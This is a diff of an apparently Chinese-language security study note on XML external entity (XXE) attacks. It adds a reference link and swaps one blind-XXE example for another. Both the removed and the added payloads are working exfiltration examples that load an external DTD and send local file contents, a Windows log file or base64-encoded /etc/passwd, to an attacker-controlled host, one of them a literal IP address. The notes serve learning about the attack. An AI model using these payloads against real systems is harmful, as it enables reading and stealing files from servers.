@@ -14,6 +14,12 @@ https://www.w3school.com.cn/xml/xml_intro.asp
 
  https://www.anquanke.com/post/id/155328 
 
+
+
+
+
+ https://xz.aliyun.com/t/3357#toc-13 
+
 ## xml语法基础
 
 xml 是语法类似html
@@ -320,23 +326,23 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 
 ### blind-xxe
 
-```xml-dtd
-<?xml version="1.0"?>
-<!DOCTYPE ANY[
-<!ENTITY % file SYSTEM "file://c:/mls_lca.log">
-<!ENTITY % remote SYSTEM "http://39.108.164.219:60001/evil.xml">
-%remote;
-%all;
+
+
+```php
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+%sp;
+%param1;
 ]>
-<root>&send;</root>
+<r>&exfil;</r>
+
+File stored on http://127.0.0.1/dtd.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
-vps:
-
-```xml-dtd
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://39.108.164.219:60000/1.php?file=%file;'>">
-
-```
 
 
 
